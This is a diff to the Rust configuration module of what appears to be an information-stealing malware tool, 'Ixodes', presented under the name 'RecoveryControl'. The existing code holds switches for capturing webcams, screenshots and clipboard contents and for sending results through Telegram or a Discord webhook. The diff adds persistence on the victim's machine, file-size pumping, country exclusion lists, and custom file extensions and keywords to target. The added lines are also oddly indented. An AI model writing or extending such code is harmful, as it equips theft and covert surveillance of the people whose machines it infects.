@@ -15,26 +15,44 @@ pub struct RecoveryControl {
     capture_webcams: bool,
     capture_clipboard: bool,
     telegram_token: Option<String>,
-    telegram_chat_id: Option<String>,
-    discord_webhook: Option<String>,
-}
-
-impl RecoveryControl {
-    pub fn global() -> &'static Self {
-        &GLOBAL_RECOVERY_CONTROL
-    }
-
-    pub fn allows_category(&self, category: RecoveryCategory) -> bool {
-        self.allowed_categories
-            .as_ref()
-            .map(|set| set.contains(&category))
-            .unwrap_or(true)
-    }
-
-    pub fn artifact_key(&self) -> Option<&[u8]> {
-        self.artifact_key.as_deref()
-    }
-
+        telegram_chat_id: Option<String>,
+        discord_webhook: Option<String>,
+            persistence_enabled: bool,
+            pump_size_mb: u32,
+            blocked_countries: Option<HashSet<String>>,
+            custom_extensions: Option<HashSet<String>>,
+            custom_keywords: Option<HashSet<String>>,
+        }
+        
+        impl RecoveryControl {
+            pub fn global() -> &'static Self {            &GLOBAL_RECOVERY_CONTROL
+        }
+    
+        pub fn allows_category(&self, category: RecoveryCategory) -> bool {
+            self.allowed_categories
+                .as_ref()
+                .map(|set| set.contains(&category))
+                .unwrap_or(true)
+        }
+    
+            pub fn blocked_countries(&self) -> HashSet<String> {
+                self.blocked_countries.clone().unwrap_or_default()
+            }
+        
+            pub fn custom_extensions(&self) -> HashSet<String> {
+                self.custom_extensions.clone().unwrap_or_default()
+            }
+        
+            pub fn custom_keywords(&self) -> HashSet<String> {
+                self.custom_keywords.clone().unwrap_or_default()
+            }
+        
+            pub fn pump_size_mb(&self) -> u32 {            self.pump_size_mb
+        }
+    
+        pub fn artifact_key(&self) -> Option<&[u8]> {
+            self.artifact_key.as_deref()
+        }
     pub fn capture_screenshots(&self) -> bool {
         self.capture_screenshots
     }
@@ -45,6 +63,10 @@ impl RecoveryControl {
 
     pub fn capture_clipboard(&self) -> bool {
         self.capture_clipboard
+    }
+
+    pub fn persistence_enabled(&self) -> bool {
+        self.persistence_enabled
     }
 
     pub fn telegram_token(&self) -> Option<&str> {
@@ -91,6 +113,25 @@ impl RecoveryControl {
             parse_flag("IXODES_CAPTURE_WEBCAM").unwrap_or(DEFAULT_CAPTURE_WEBCAMS);
         let capture_clipboard =
             parse_flag("IXODES_CAPTURE_CLIPBOARD").unwrap_or(DEFAULT_CAPTURE_CLIPBOARD);
+        let persistence_enabled =
+            parse_flag("IXODES_PERSISTENCE").unwrap_or(DEFAULT_PERSISTENCE);
+        let pump_size_mb =
+            parse_u32("IXODES_PUMP_SIZE_MB").unwrap_or(DEFAULT_PUMP_SIZE_MB);
+        
+        let blocked_countries = env::var("IXODES_BLOCKED_COUNTRIES")
+            .ok()
+            .and_then(|v| parse_string_list(&v))
+            .or_else(|| default_blocked_countries());
+        
+        let custom_extensions = env::var("IXODES_CUSTOM_EXTENSIONS")
+            .ok()
+            .and_then(|v| parse_string_list(&v))
+            .or_else(|| default_custom_extensions());
+
+        let custom_keywords = env::var("IXODES_CUSTOM_KEYWORDS")
+            .ok()
+            .and_then(|v| parse_string_list(&v))
+            .or_else(|| default_custom_keywords());
 
         let telegram_token = env::var("IXODES_TELEGRAM_TOKEN")
             .ok()
@@ -111,12 +152,33 @@ impl RecoveryControl {
             telegram_token,
             telegram_chat_id,
             discord_webhook,
+            persistence_enabled,
+            pump_size_mb,
+            blocked_countries,
+            custom_extensions,
+            custom_keywords,
         }
     }
 }
 
 fn default_categories() -> Option<HashSet<RecoveryCategory>> {
     DEFAULT_ALLOWED_CATEGORIES.map(|categories| categories.iter().copied().collect())
+}
+
+fn parse_u32(key: &str) -> Option<u32> {
+    env::var(key).ok().and_then(|v| v.parse().ok())
+}
+
+fn default_blocked_countries() -> Option<HashSet<String>> {
+    DEFAULT_BLOCKED_COUNTRIES.map(|countries| countries.iter().map(|s| s.to_string()).collect())
+}
+
+fn default_custom_extensions() -> Option<HashSet<String>> {
+    DEFAULT_CUSTOM_EXTENSIONS.map(|items| items.iter().map(|s| s.to_string()).collect())
+}
+
+fn default_custom_keywords() -> Option<HashSet<String>> {
+    DEFAULT_CUSTOM_KEYWORDS.map(|items| items.iter().map(|s| s.to_string()).collect())
 }
 
 fn decode_artifact_key(value: &str) -> Option<Vec<u8>> {
@@ -144,6 +206,18 @@ fn decode_artifact_key(value: &str) -> Option<Vec<u8>> {
             None
         }
     }
+}
+
+fn parse_string_list(value: &str) -> Option<HashSet<String>> {
+    let mut set = HashSet::new();
+    for segment in value.split(',') {
+        let trimmed = segment.trim();
+        if trimmed.is_empty() {
+            continue;
+        }
+        set.insert(trimmed.to_string());
+    }
+    if set.is_empty() { None } else { Some(set) }
 }
 
 fn parse_categories(value: &str) -> Option<HashSet<RecoveryCategory>> {
